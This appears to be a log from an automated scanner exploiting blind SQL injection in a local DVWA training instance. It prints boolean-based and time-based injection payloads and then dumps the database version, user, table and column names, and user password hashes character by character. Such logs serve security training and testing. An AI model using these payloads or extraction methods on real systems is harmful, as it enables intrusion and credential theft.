2016-07-11 16:00:28  16:00:28 Checking Form Vuln with Referer: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/
2016-07-11 16:00:28  Checking Form SQLInjection: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=6972375&Submit=Submit
2016-07-11 16:00:29  16:00:29 Checking SQL Injection, ErrorBased, Parameter: id
2016-07-11 16:00:29  16:00:29 Checking SQL Injection, BooleanBased, Parameter: id
2016-07-11 16:00:29  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375  Integer URL1 StatusCode!=OK
2016-07-11 16:00:29  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=99999999  Integer URL1 StatusCode!=OK
2016-07-11 16:00:29  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=99999999  Integer URL1 StatusCode!=OK
2016-07-11 16:00:30  COOKIE  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&^id=6972375  Integer URL1 StatusCode!=OK
2016-07-11 16:00:30  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375  String URL1 StatusCode!=OK
2016-07-11 16:00:30  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=99999999  String KeyWord=exists
2016-07-11 16:00:30  16:00:30 Found BooleanBased SQL Injection Vuln: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=99999999%27 oR 8851306=8851306 aNd %276199%27=%276199
2016-07-11 16:00:30  16:00:30 Checking SQL Injection, BooleanBased Rlike Blind, Parameter: id
2016-07-11 16:00:30  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375  Integer URL1 StatusCode!=OK
2016-07-11 16:00:30  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375  String URL1 StatusCode!=OK
2016-07-11 16:00:30  GET  http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375  Search URL1 StatusCode!=OK
2016-07-11 16:00:30  16:00:30 Checking SQL Injection, TimeBased, Parameter: id
2016-07-11 16:00:45  16:00:45 Found TimeBased SQL Injection Vuln: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?Submit=Submit&id=6972375%27 oR if(length(0x574352575653)>1,sleep(3),0) -- 
2016-07-11 16:00:45  Checking Form XSS: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=6972375&Submit=Submit
2016-07-11 16:00:46  End Check XSS Vuln: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=6972375&Submit=Submit
2016-07-11 16:00:46  Checking Form LFI: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=6972375&Submit=Submit
2016-07-11 16:00:48  Checking Form RFI: http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=6972375&Submit=Submit
2016-07-11 16:01:10  16:01:10 Trying Injection Method ...
2016-07-11 16:01:10  16:01:10 Getting the number of fields in SQL ...
2016-07-11 16:01:10  16:01:10 Got field number: 1
2016-07-11 16:01:10  16:01:10 Checking if there is an injectale field in SQL ...
2016-07-11 16:01:10  16:01:10 Got: BooleanBased
2016-07-11 16:01:11  16:01:11 Got Length: 6
2016-07-11 16:01:11  16:01:11 Got 1/6 :  5
2016-07-11 16:01:12  16:01:12 Got 2/6 :  5.
2016-07-11 16:01:12  16:01:12 Got 3/6 :  5.5
2016-07-11 16:01:12  16:01:12 Got 4/6 :  5.5.
2016-07-11 16:01:13  16:01:13 Got 5/6 :  5.5.3
2016-07-11 16:01:13  16:01:13 Got 6/6 :  5.5.32
2016-07-11 16:01:13  16:01:13 Got Length: 5
2016-07-11 16:01:14  16:01:14 Got 1/5 :  W
2016-07-11 16:01:14  16:01:14 Got 2/5 :  Wi
2016-07-11 16:01:15  16:01:15 Got 3/5 :  Win
2016-07-11 16:01:15  16:01:15 Got 4/5 :  Win3
2016-07-11 16:01:15  16:01:15 Got 5/5 :  Win32
2016-07-11 16:01:16  16:01:16 Got Length: 14
2016-07-11 16:01:16  16:01:16 Got 1/14 :  r
2016-07-11 16:01:16  16:01:16 Got 2/14 :  ro
2016-07-11 16:01:17  16:01:17 Got 3/14 :  roo
2016-07-11 16:01:17  16:01:17 Got 4/14 :  root
2016-07-11 16:01:18  16:01:18 Got 5/14 :  root@
2016-07-11 16:01:18  16:01:18 Got 6/14 :  root@l
2016-07-11 16:01:18  16:01:18 Got 7/14 :  root@lo
2016-07-11 16:01:19  16:01:19 Got 8/14 :  root@loc
2016-07-11 16:01:19  16:01:19 Got 9/14 :  root@loca
2016-07-11 16:01:20  16:01:20 Got 10/14 :  root@local
2016-07-11 16:01:20  16:01:20 Got 11/14 :  root@localh
2016-07-11 16:01:20  16:01:20 Got 12/14 :  root@localho
2016-07-11 16:01:21  16:01:21 Got 13/14 :  root@localhos
2016-07-11 16:01:21  16:01:21 Got 14/14 :  root@localhost
2016-07-11 16:01:21  16:01:21 Got Length: 4
2016-07-11 16:01:22  16:01:22 Got 1/4 :  d
2016-07-11 16:01:22  16:01:22 Got 2/4 :  dv
2016-07-11 16:01:23  16:01:23 Got 3/4 :  dvw
2016-07-11 16:01:23  16:01:23 Got 4/4 :  dvwa
2016-07-11 16:01:24  16:01:24 Got Length: 0
2016-07-11 16:01:31  16:01:31 Getting Tables ...
2016-07-11 16:01:32  16:01:32 Got Table Num: 2
2016-07-11 16:01:32  16:01:32 Got Length: 5
2016-07-11 16:01:32  16:01:32 Got Length: 9
2016-07-11 16:01:33  16:01:33 Got 1/9 :  g
2016-07-11 16:01:33  16:01:33 Got 1/5 :  u
2016-07-11 16:01:34  16:01:34 Got 2/9 :  gu
2016-07-11 16:01:34  16:01:34 Got 2/5 :  us
2016-07-11 16:01:34  16:01:34 Got 3/9 :  gue
2016-07-11 16:01:34  16:01:34 Got 3/5 :  use
2016-07-11 16:01:35  16:01:35 Got 4/9 :  gues
2016-07-11 16:01:35  16:01:35 Got 4/5 :  user
2016-07-11 16:01:36  16:01:36 Got 5/9 :  guest
2016-07-11 16:01:36  16:01:36 Got 5/5 :  users
2016-07-11 16:01:36  16:01:36 Got 6/9 :  guestb
2016-07-11 16:01:37  16:01:37 Got 7/9 :  guestbo
2016-07-11 16:01:37  16:01:37 Got 8/9 :  guestboo
2016-07-11 16:01:37  16:01:37 Got 9/9 :  guestbook
2016-07-11 16:01:43  16:01:43 Getting Columns ...
2016-07-11 16:01:44  16:01:44 Got Column Num: 8
2016-07-11 16:01:44  16:01:44 Got Length: 7
2016-07-11 16:01:44  16:01:44 Got Length: 9
2016-07-11 16:01:45  16:01:45 Got Length: 10
2016-07-11 16:01:45  16:01:45 Got Length: 4
2016-07-11 16:01:45  16:01:45 Got Length: 8
2016-07-11 16:01:46  16:01:46 Got Length: 6
2016-07-11 16:01:46  16:01:46 Got 1/7 :  u
2016-07-11 16:01:47  16:01:47 Got Length: 10
2016-07-11 16:01:47  16:01:47 Got 1/9 :  l
2016-07-11 16:01:47  16:01:47 Got Length: 12
2016-07-11 16:01:47  16:01:47 Got 1/4 :  u
2016-07-11 16:01:48  16:01:48 Got 1/10 :  f
2016-07-11 16:01:48  16:01:48 Got 1/8 :  p
2016-07-11 16:01:48  16:01:48 Got 2/7 :  us
2016-07-11 16:01:49  16:01:49 Got 1/6 :  a
2016-07-11 16:01:49  16:01:49 Got 1/10 :  l
2016-07-11 16:01:50  16:01:50 Got 2/4 :  us
2016-07-11 16:01:50  16:01:50 Got 2/9 :  la
2016-07-11 16:01:50  16:01:50 Got 1/12 :  f
2016-07-11 16:01:50  16:01:50 Got 2/10 :  fi
2016-07-11 16:01:51  16:01:51 Got 2/8 :  pa
2016-07-11 16:01:51  16:01:51 Got 3/7 :  use
2016-07-11 16:01:52  16:01:52 Got 2/6 :  av
2016-07-11 16:01:52  16:01:52 Got 3/9 :  las
2016-07-11 16:01:52  16:01:52 Got 2/10 :  la
2016-07-11 16:01:52  16:01:52 Got 3/4 :  use
2016-07-11 16:01:53  16:01:53 Got 3/8 :  pas
2016-07-11 16:01:53  16:01:53 Got 2/12 :  fa
2016-07-11 16:01:54  16:01:54 Got 3/10 :  fir
2016-07-11 16:01:54  16:01:54 Got 4/7 :  user
2016-07-11 16:01:54  16:01:54 Got 3/6 :  ava
2016-07-11 16:01:55  16:01:55 Got 3/10 :  las
2016-07-11 16:01:55  16:01:55 Got 5/7 :  user_
2016-07-11 16:01:55  16:01:55 Got 4/9 :  last
2016-07-11 16:01:55  16:01:55 Got 4/8 :  pass
2016-07-11 16:01:55  16:01:55 Got 4/4 :  user
2016-07-11 16:01:56  16:01:56 Got 3/12 :  fai
2016-07-11 16:01:56  16:01:56 Got 4/10 :  firs
2016-07-11 16:01:56  16:01:56 Got 5/9 :  last_
2016-07-11 16:01:57  16:01:57 Got 5/8 :  passw
2016-07-11 16:01:57  16:01:57 Got 4/6 :  avat
2016-07-11 16:01:57  16:01:57 Got 4/10 :  last
2016-07-11 16:01:58  16:01:58 Got 6/7 :  user_i
2016-07-11 16:01:58  16:01:58 Got 6/8 :  passwo
2016-07-11 16:01:58  16:01:58 Got 4/12 :  fail
2016-07-11 16:01:58  16:01:58 Got 5/10 :  last_
2016-07-11 16:01:58  16:01:58 Got 5/10 :  first
2016-07-11 16:01:59  16:01:59 Got 6/9 :  last_n
2016-07-11 16:01:59  16:01:59 Got 6/10 :  first_
2016-07-11 16:02:00  16:02:00 Got 5/6 :  avata
2016-07-11 16:02:00  16:02:00 Got 7/7 :  user_id
2016-07-11 16:02:01  16:02:01 Got 5/12 :  faile
2016-07-11 16:02:01  16:02:01 Got 7/8 :  passwor
2016-07-11 16:02:01  16:02:01 Got 6/10 :  last_l
2016-07-11 16:02:01  16:02:01 Got 7/9 :  last_na
2016-07-11 16:02:02  16:02:02 Got 7/10 :  first_n
2016-07-11 16:02:02  16:02:02 Got 6/6 :  avatar
2016-07-11 16:02:02  16:02:02 Got 7/10 :  last_lo
2016-07-11 16:02:03  16:02:03 Got 6/12 :  failed
2016-07-11 16:02:03  16:02:03 Got 8/9 :  last_nam
2016-07-11 16:02:03  16:02:03 Got 8/8 :  password
2016-07-11 16:02:03  16:02:03 Got 8/10 :  last_log
2016-07-11 16:02:03  16:02:03 Got 7/12 :  failed_
2016-07-11 16:02:03  16:02:03 Got 8/10 :  first_na
2016-07-11 16:02:04  16:02:04 Got 9/9 :  last_name
2016-07-11 16:02:05  16:02:05 Got 9/10 :  last_logi
2016-07-11 16:02:05  16:02:05 Got 9/10 :  first_nam
2016-07-11 16:02:05  16:02:05 Got 8/12 :  failed_l
2016-07-11 16:02:05  16:02:05 Got 9/12 :  failed_lo
2016-07-11 16:02:06  16:02:06 Got 10/10 :  last_login
2016-07-11 16:02:06  16:02:06 Got 10/10 :  first_name
2016-07-11 16:02:06  16:02:06 Got 10/12 :  failed_log
2016-07-11 16:02:07  16:02:07 Got 11/12 :  failed_logi
2016-07-11 16:02:07  16:02:07 Got 12/12 :  failed_login
2016-07-11 16:02:19  16:02:19 Getting Data ...
2016-07-11 16:02:19  16:02:19 Got Rows Num: -1
2016-07-11 16:02:21  16:02:21 Got Length: 40
2016-07-11 16:02:21  16:02:21 Got Length: 42
2016-07-11 16:02:21  16:02:21 Got 1/42 :  g
2016-07-11 16:02:21  16:02:21 Got 1/40 :  a
2016-07-11 16:02:22  16:02:22 Got 2/42 :  go
2016-07-11 16:02:22  16:02:22 Got 2/40 :  ad
2016-07-11 16:02:22  16:02:22 Got 3/42 :  gor
2016-07-11 16:02:23  16:02:23 Got 3/40 :  adm
2016-07-11 16:02:23  16:02:23 Got 4/42 :  gord
2016-07-11 16:02:23  16:02:23 Got 4/40 :  admi
2016-07-11 16:02:24  16:02:24 Got 5/42 :  gordo
2016-07-11 16:02:24  16:02:24 Got 5/40 :  admin
2016-07-11 16:02:24  16:02:24 Got 6/42 :  gordon
2016-07-11 16:02:25  16:02:25 Got 6/40 :  admin^
2016-07-11 16:02:25  16:02:25 Got 7/42 :  gordonb
2016-07-11 16:02:25  16:02:25 Got 7/40 :  admin^1
2016-07-11 16:02:26  16:02:26 Got 8/42 :  gordonb^
2016-07-11 16:02:26  16:02:26 Got 8/40 :  admin^1^
2016-07-11 16:02:26  16:02:26 Got 9/42 :  gordonb^2
2016-07-11 16:02:27  16:02:27 Got 9/40 :  admin^1^5
2016-07-11 16:02:27  16:02:27 Got 10/42 :  gordonb^2^
2016-07-11 16:02:28  16:02:28 Got 10/40 :  admin^1^5f
2016-07-11 16:02:28  16:02:28 Got 11/42 :  gordonb^2^e
2016-07-11 16:02:28  16:02:28 Got 11/40 :  admin^1^5f4
2016-07-11 16:02:29  16:02:29 Got 12/42 :  gordonb^2^e9
2016-07-11 16:02:29  16:02:29 Got 12/40 :  admin^1^5f4d
2016-07-11 16:02:29  16:02:29 Got 13/42 :  gordonb^2^e99
2016-07-11 16:02:30  16:02:30 Got 13/40 :  admin^1^5f4dc
2016-07-11 16:02:30  16:02:30 Got 14/42 :  gordonb^2^e99a
2016-07-11 16:02:30  16:02:30 Got 14/40 :  admin^1^5f4dcc
2016-07-11 16:02:31  16:02:31 Got 15/42 :  gordonb^2^e99a1
2016-07-11 16:02:31  16:02:31 Got 15/40 :  admin^1^5f4dcc3
2016-07-11 16:02:31  16:02:31 Got 16/42 :  gordonb^2^e99a18
2016-07-11 16:02:31  16:02:31 Got 16/40 :  admin^1^5f4dcc3b
2016-07-11 16:02:31  16:02:31 Got 17/42 :  gordonb^2^e99a18c
2016-07-11 16:02:32  16:02:32 Got 17/40 :  admin^1^5f4dcc3b5
2016-07-11 16:02:32  16:02:32 Got 18/42 :  gordonb^2^e99a18c4
2016-07-11 16:02:32  16:02:32 Got 18/40 :  admin^1^5f4dcc3b5a
2016-07-11 16:02:33  16:02:33 Got 19/42 :  gordonb^2^e99a18c42
2016-07-11 16:02:33  16:02:33 Got 19/40 :  admin^1^5f4dcc3b5aa
2016-07-11 16:02:33  16:02:33 Got 20/40 :  admin^1^5f4dcc3b5aa7
2016-07-11 16:02:33  16:02:33 Got 20/42 :  gordonb^2^e99a18c428
2016-07-11 16:02:34  16:02:34 Got 21/42 :  gordonb^2^e99a18c428c
2016-07-11 16:02:34  16:02:34 Got 21/40 :  admin^1^5f4dcc3b5aa76
2016-07-11 16:02:35  16:02:35 Got 22/42 :  gordonb^2^e99a18c428cb
2016-07-11 16:02:35  16:02:35 Got 22/40 :  admin^1^5f4dcc3b5aa765
2016-07-11 16:02:35  16:02:35 Got 23/42 :  gordonb^2^e99a18c428cb3
2016-07-11 16:02:36  16:02:36 Got 23/40 :  admin^1^5f4dcc3b5aa765d
2016-07-11 16:02:36  16:02:36 Got 24/42 :  gordonb^2^e99a18c428cb38
2016-07-11 16:02:36  16:02:36 Got 24/40 :  admin^1^5f4dcc3b5aa765d6
2016-07-11 16:02:37  16:02:37 Got 25/42 :  gordonb^2^e99a18c428cb38d
2016-07-11 16:02:37  16:02:37 Got 25/40 :  admin^1^5f4dcc3b5aa765d61
2016-07-11 16:02:37  16:02:37 Got 26/42 :  gordonb^2^e99a18c428cb38d5
2016-07-11 16:02:38  16:02:38 Got 26/40 :  admin^1^5f4dcc3b5aa765d61d
2016-07-11 16:02:38  16:02:38 Got 27/42 :  gordonb^2^e99a18c428cb38d5f
2016-07-11 16:02:38  16:02:38 Got 27/40 :  admin^1^5f4dcc3b5aa765d61d8
2016-07-11 16:02:39  16:02:39 Got 28/42 :  gordonb^2^e99a18c428cb38d5f2
2016-07-11 16:02:39  16:02:39 Got 28/40 :  admin^1^5f4dcc3b5aa765d61d83
2016-07-11 16:02:39  16:02:39 Got 29/42 :  gordonb^2^e99a18c428cb38d5f26
2016-07-11 16:02:39  16:02:39 Got 29/40 :  admin^1^5f4dcc3b5aa765d61d832
2016-07-11 16:02:40  16:02:40 Got 30/40 :  admin^1^5f4dcc3b5aa765d61d8327
2016-07-11 16:02:40  16:02:40 Got 30/42 :  gordonb^2^e99a18c428cb38d5f260
2016-07-11 16:02:41  16:02:41 Got 31/40 :  admin^1^5f4dcc3b5aa765d61d8327d
2016-07-11 16:02:41  16:02:41 Got 31/42 :  gordonb^2^e99a18c428cb38d5f2608
2016-07-11 16:02:41  16:02:41 Got 32/40 :  admin^1^5f4dcc3b5aa765d61d8327de
2016-07-11 16:02:41  16:02:41 Got 32/42 :  gordonb^2^e99a18c428cb38d5f26085
2016-07-11 16:02:42  16:02:42 Got 33/42 :  gordonb^2^e99a18c428cb38d5f260853
2016-07-11 16:02:42  16:02:42 Got 33/40 :  admin^1^5f4dcc3b5aa765d61d8327deb
2016-07-11 16:02:43  16:02:43 Got 34/42 :  gordonb^2^e99a18c428cb38d5f2608536
2016-07-11 16:02:43  16:02:43 Got 34/40 :  admin^1^5f4dcc3b5aa765d61d8327deb8
2016-07-11 16:02:43  16:02:43 Got 35/42 :  gordonb^2^e99a18c428cb38d5f26085367
2016-07-11 16:02:43  16:02:43 Got 35/40 :  admin^1^5f4dcc3b5aa765d61d8327deb88
2016-07-11 16:02:44  16:02:44 Got 36/42 :  gordonb^2^e99a18c428cb38d5f260853678
2016-07-11 16:02:44  16:02:44 Got 36/40 :  admin^1^5f4dcc3b5aa765d61d8327deb882
2016-07-11 16:02:45  16:02:45 Got 37/42 :  gordonb^2^e99a18c428cb38d5f2608536789
2016-07-11 16:02:45  16:02:45 Got 37/40 :  admin^1^5f4dcc3b5aa765d61d8327deb882c
2016-07-11 16:02:45  16:02:45 Got 38/42 :  gordonb^2^e99a18c428cb38d5f26085367892
2016-07-11 16:02:46  16:02:46 Got 38/40 :  admin^1^5f4dcc3b5aa765d61d8327deb882cf
2016-07-11 16:02:46  16:02:46 Got 39/42 :  gordonb^2^e99a18c428cb38d5f260853678922
2016-07-11 16:02:46  16:02:46 Got 39/40 :  admin^1^5f4dcc3b5aa765d61d8327deb882cf9
2016-07-11 16:02:47  16:02:47 Got 40/42 :  gordonb^2^e99a18c428cb38d5f260853678922e
2016-07-11 16:02:47  16:02:47 Got 40/40 :  admin^1^5f4dcc3b5aa765d61d8327deb882cf99
2016-07-11 16:02:47  16:02:47 Got 41/42 :  gordonb^2^e99a18c428cb38d5f260853678922e0
2016-07-11 16:02:48  16:02:48 Got 42/42 :  gordonb^2^e99a18c428cb38d5f260853678922e03
